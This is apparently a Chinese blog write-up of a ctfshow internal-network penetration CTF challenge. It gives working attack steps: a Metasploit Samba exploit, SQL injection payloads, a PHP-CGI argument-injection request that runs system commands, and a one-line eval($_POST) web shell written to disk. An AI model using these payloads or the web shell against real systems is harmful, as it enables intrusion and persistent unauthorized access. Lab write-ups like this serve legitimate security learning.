# ctfshow内网渗透复现

<br>

## 复现过程

<br>

先放一下ssh命令:

````
ssh ctfshow@pwn.challenge.ctf.show -p 28169       #用于ssh连接题目shell
scp -P 28169 local_file ctfshow@pwn.challenge.ctf.show:/tmp     #用于上传东西
````

### 1.根据提示寻找有用的工具

<br>

题目提示我们攻击机有工具，利用find命令可以找到。或者直接乱翻文件，msf就在/opt目录下.

````
find / -name metasploit-framework
````
直接使用msfconsole报错，使用chmod 777 metasploit-framework 给权限后可以直接使用了


<img src="https://54huarui.github.io/blogs/internalwww/1.png" width="880" height="480">

<br>

### 2.扫描

<br>

因为是内网渗透，所以还是要做一些扫描。

上传fscan并扫描内网
````
scp -P 28169 local_file ctfshow@pwn.challenge.ctf.show:/remote/directory/
ifconfig           #查看ip
./fscan -h 172.2.162.4/24 -o fscan.log #扫描

````


<img src="https://54huarui.github.io/blogs/internalwww/2.png" width="880" height="480">


<br>

<img src="https://54huarui.github.io/blogs/internalwww/3.png" width="880" height="480">

<br>

### 3.公鸡

<br>

这里我在网上找到个很奇怪的解，已知445端口存在一个samba的洞，可以直接打下来
````
msfconsole
use exploit/linux/samba/is_known_pipename
set rhost x.x.x.x
exploit 
````

然鹅卡在获得Starting interaction with 1...的提示了。这边不打算尝试了，估计是非预期解被修复了

本着学习的目的，继续尝试网上其他大佬的解法

<br>


刚刚扫描的时候发现一个80端口和文件管理系统，我们想办法进入看看怎么个事。网上有两种办法，一个是用ssh搭
socks5隧道，第二种就是用ssh映射直接映射到本地端口。我这里选择第二种办法

````
ssh -L 8085:172.2.249.5:80 ctfshow@pwn.challenge.ctf.show -p 28195
````

然后可以直接访问本地的8085端口

<img src="https://54huarui.github.io/blogs/internalwww/4.png" width="880" height="480">

<br>

这里考了个沟槽的代码审计，审的是sql注入。根据回显得到账号密码


````
username=admin&email='union/**/select/**/username/**/from/**/user#@qq.com

username=admin&email='union/**/select/**/password/**/from/**/user#@qq.com
````

得到账号密码ctfshow和ctfshase

<br>

md，复现到这里才知道，原来上面的samba才是真解，不过不管了，硬着头皮继续做复现
回到fscan记得这里发现了一个cve

<img src="https://54huarui.github.io/blogs/internalwww/6.png" width="880" height="480">

<br>

可以使用这个方法直接命令执行
````
POST /index.php/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1

<?php echo system("ls"); ?>
````

<img src="https://54huarui.github.io/blogs/internalwww/7.png" width="880" height="480">


写shell咯
````
<?php echo system("echo '<? @eval(\$_POST[a]);?>' > 1.php");?>
````

<br>

至此，三个内网主机已经全部拿下。




























<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>



## 写在后面

有些东西不好明说，但是那种感觉又回来了。我得马上调整回来
